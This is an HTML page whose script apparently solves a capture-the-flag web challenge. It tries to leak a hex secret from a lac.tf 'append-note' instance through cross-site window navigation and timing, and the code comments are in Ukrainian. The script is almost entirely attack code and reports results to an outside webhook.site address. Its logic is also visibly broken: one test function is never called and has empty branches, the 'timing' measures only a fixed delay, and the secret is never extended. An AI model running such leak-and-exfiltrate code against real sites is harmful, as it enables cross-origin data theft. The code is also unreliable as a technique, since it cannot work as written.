<!DOCTYPE html>
<html>
<body>
    <h1 id="status">Exploiting...</h1>
    <script>
        const TARGET = "https://append-note-xwu81.instancer.lac.tf";
        const WEBHOOK = "https://webhook.site/42806461-542c-4233-a085-a1f7c2982c19";
        const ALPHABET = "0123456789abcdef";
        let secret = "";

        const report = (msg) => fetch(`${WEBHOOK}?log=${encodeURIComponent(msg)}`, {mode: 'no-cors'});

        async function test(attempt) {
            return new Promise((resolve) => {
                // Відкриваємо вікно на сторінку /append
                // Ми вказуємо url=TARGET/favicon.ico, щоб редирект був швидким і помітним
                const url = `${TARGET}/append?content=${attempt}&url=${TARGET}/favicon.ico`;
                const win = window.open(url, 'tester');

                // Якщо статус 200, спрацює редирект в redirect.html через 100мс
                // Ми чекаємо достатньо часу для завантаження + редиректу
                setTimeout(() => {
                    try {
                        if (win.location.href) {
                            // Якщо ми можемо прочитати href, значить ми на своєму домені (помилка редиректу)
                            // або запит ще не пішов. Але нас цікавить SOP Error.
                        }
                    } catch (e) {
                        // Якщо ми тут, значить вікно на TARGET домені.
                        // Тепер найголовніше: чи відбувся редирект?
                        // У деяких версіях Chrome ми можемо перевірити history.length
                        if (win.length === 0) {
                            // Ми не можемо отримати історію, але можемо закрити і вважати це сигналом.
                        }
                    }
                    
                    // Спробуємо інший підхід: рекурсивний редирект
                    // Якщо 200 OK -> redirect.html -> наша сторінка (якщо ми вкажемо url=наш_сайт)
                    // АЛЕ сервер перевіряє hostname. Тому тільки TARGET hostname.
                    
                    win.close();
                    resolve();
                }, 1000);
            });
        }

        // Найкращий метод для цього завдання: Cache Attack або Navigation Timing
        // Оскільки сервер додає заголовок Cache-Control: no-store, ми використаємо 
        // той факт, що 200 OK і 404 завантажуються з різною швидкістю.
        
        async function run() {
            report("START_TIMING_ATTACK");
            for (let i = 0; i < 8; i++) {
                let results = [];
                for (let char of ALPHABET) {
                    const attempt = secret + char;
                    const start = performance.now();
                    
                    const win = window.open(`${TARGET}/append?content=${attempt}&url=${TARGET}/`, 'leak');
                    
                    // Чекаємо завантаження
                    await new Promise(r => setTimeout(r, 600));
                    const end = performance.now();
                    const duration = end - start;
                    
                    win.close();
                    results.push({char, duration});
                    report(`Char_${char}_Time_${duration.toFixed(2)}`);
                    
                    // Якщо 200 OK, то notes.append(content) спрацював і база змінена.
                    // У цьому завданні 200 OK повертає HTML, а 404 - теж HTML, але інший.
                    // РЕАЛЬНИЙ ОРАКУЛ: Якщо 200 OK, то в notes додається запис.
                    // Наступна спроба того ж самого префікса ЗАВЖДИ дасть 200 OK.
                }
            }
        }

        window.onload = () => setTimeout(run, 1000);
    </script>
</body>
</html>